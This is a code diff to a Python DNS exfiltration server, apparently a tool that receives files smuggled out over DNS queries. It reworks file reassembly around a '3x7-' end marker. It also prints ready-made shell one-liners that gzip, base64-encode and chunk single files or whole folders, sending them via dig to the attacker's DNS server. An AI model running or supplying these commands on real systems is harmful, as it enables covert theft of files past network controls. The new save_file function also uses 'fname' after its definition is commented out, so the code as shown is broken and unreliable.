@@ -187,7 +187,7 @@ class DNSQuery:
         if self.data_text:
             packet += self.data[:2] + b"\x81\x80"
             packet += (
-                self.data[4:6] + b"\x00\x01" + self.data[8:12]
+                self.data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
             )  # Questions and Answers Counts
             packet += self.data[12:rr_i]  # Original Domain Name Question
             packet += b"\xc0\x0c"  # Pointer to domain name
@@ -199,64 +199,59 @@ class DNSQuery:
         return packet
 
 
-def save_to_file(r_data, z, v):
+def save_file(key, value, z):
+    file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
+    # fname = f"received_{file_seed}_{key}"
+    flatdata = b""
 
-    for key, value in r_data.items():
+    if not value:
+        logger.debug(
+            "Skipping reassembly of file, since no payload was received.",
+            file=fname,
+        )
+        return
 
-        file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
-        # fname = f"received_{file_seed}_{key}"
-        flatdata = b""
+    logger.debug("Reassembling file", file=fname, value=value)
 
-        if not value:
-            logger.debug(
-                "Skipping reassembly of file, since no payload was received.",
-                file=fname,
-            )
-            continue
+    try:
+        for i in range(0, max(value.keys()) + 1):
+            for block in value[i]:
+                fixed_block = block[:-1].replace(b"*", b"+")
+                flatdata += fixed_block
+    except KeyError as key_error:
+        logger.exception("Missing index for file.", key=key, exc_info=True)
 
-        logger.debug("Reassembling file", file=fname, value=value)
-
-        try:
-            for i in range(0, max(value.keys()) + 1):
-                for block in value[i]:
-                    fixed_block = block[:-1].replace(b"*", b"+")
-                    flatdata += fixed_block
-        except KeyError as key_error:
-            logger.exception("Missing index for file.", key=key, exc_info=True)
-
-        try:
-            f = open(fname, "wb")
-        except Exception:
-            logger.exception("Failed opening file", file=fname, exc_info=True)
-            exit(1)
-        try:
-            logger.debug("Base64 decoding data.", key=key)
-            flatdata = base64.b64decode(
-                flatdata
-            )  # test if padding correct by using a try/catch
-        except Exception:
-            f.close()
-            logger.exception("Incorrect padding on base64 encoded data..")
-            exit(1)
-
-        if z:
-            logger.debug("Unzipping data", key=key)
-
-            try:
-                x = zlib.decompressobj(16 + zlib.MAX_WBITS)
-                flatdata = x.decompress(flatdata)
-            except:
-                logger.exception(
-                    "Could not unzip data, did you specify the -z switch ?"
-                )
-                exit(1)
-
-        logger.info("Saving received bytes to file", file=fname)
-        f.write(flatdata)
+    try:
+        f = open(fname, "wb")
+    except Exception:
+        logger.exception("Failed opening file", file=fname, exc_info=True)
+        exit(1)
+    try:
+        logger.debug("Base64 decoding data.", key=key)
+        flatdata = base64.b64decode(
+            flatdata
+        )  # test if padding correct by using a try/catch
+    except Exception:
         f.close()
+        logger.exception("Incorrect padding on base64 encoded data..")
+        exit(1)
 
-        md5sum = hashlib.md5(open(fname, "rb").read()).hexdigest()
-        logger.info("Saved file", file=fname, md5sum=md5sum)
+    if z:
+        logger.debug("Unzipping data", key=key)
+
+        try:
+            x = zlib.decompressobj(16 + zlib.MAX_WBITS)
+            flatdata = x.decompress(flatdata)
+        except:
+            logger.exception("Could not unzip data, did you specify the -z switch ?")
+            exit(1)
+
+    logger.info("Saving received bytes to file", file=fname)
+    f.write(flatdata)
+    f.close()
+
+    md5sum = hashlib.md5(open(fname, "rb").read()).hexdigest()
+    logger.info("Saved file", file=fname, md5sum=md5sum)
 
 
 def usage(str=""):
@@ -311,23 +306,39 @@ def p_cmds(s, b, ip, z):
     if z:
         print(f"{c['y']}[?]{c['e']} Copy individual file (ZIP enabled)")
         print(
-            f"""\t{c["r"]}\x23{c["e"]} {c["y"]}f=file.txt{c["e"]}; s={s};b={b};c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
+            f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+            'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
+            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+            f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
         )
         print()
         print(f"{c['y']}[?]{c['e']} Copy entire folder (ZIP enabled)")
         print(
-            f"""\t{c["r"]}\x23{c["e"]} for f in $(ls .); do s={s};b={b};c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done"""
+            f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
+            'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
+            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+            f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
         )
         print()
     else:
         print(f"{c['y']}[?]{c['e']} Copy individual file")
         print(
-            f"""\t{c["r"]}\x23{c["e"]} {c["y"]}f=file.txt{c["e"]}; s={s};b={b};c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
+            f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+            'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
+            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); '
+            f'else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
         )
         print()
         print("{c['y']}[?]{c['e']} Copy entire folder")
         print(
-            f"""\t{c["r"]}\x23{c["e"]} for f in $(ls .); do s={s};b={b};c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done"""
+            f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
+            'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
+            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else '
+            f'echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done; '
+            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
         )
         print()
 
@@ -443,32 +454,36 @@ if __name__ == "__main__":
                 continue
 
             magic_nr = tmp_data[0]
-            if magic_nr != b"3x6-":
+            if magic_nr == b"3x6-":
+                try:
+                    index = int(tmp_data[1].rstrip(b"-"))
+                except ValueError as err:
+                    # This should usually not happen
+                    logger.debug(
+                        "Skipping packet since its index was not a number",
+                        packet=req_split,
+                    )
+                    continue
+
+                logger.info("Received data", data_length=len(p.data_text), file=fname)
+                logger.debug(
+                    "Received data text on server", data=p.data_text, ip=ip, port=53
+                )
+
+                r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
+            elif magic_nr == b"3x7-":
+                logger.info("Received file end marker", file=fname)
+                save_file(fname, r_data[fname], z)
+                del r_data[fname]
+            else:
                 logger.debug(
                     "Skipping packet since it does not have magic nr 3x6",
                     packet=req_split,
                 )
                 continue
 
-            try:
-                index = int(tmp_data[1].rstrip(b"-"))
-            except ValueError as err:
-                # This should usually not happen
-                logger.debug(
-                    "Skipping packet since its index was not a number", packet=req_split
-                )
-                continue
-
-            logger.info("Received data", data_length=len(p.data_text), file=fname)
-            logger.debug(
-                "Received data text on server", data=p.data_text, ip=ip, port=53
-            )
-
-            r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
-
             # print r_data
 
     except KeyboardInterrupt:
-        save_to_file(r_data, z, v)
         print("\n\033[1;31m[!]\033[0m Closing...")
         udp.close()
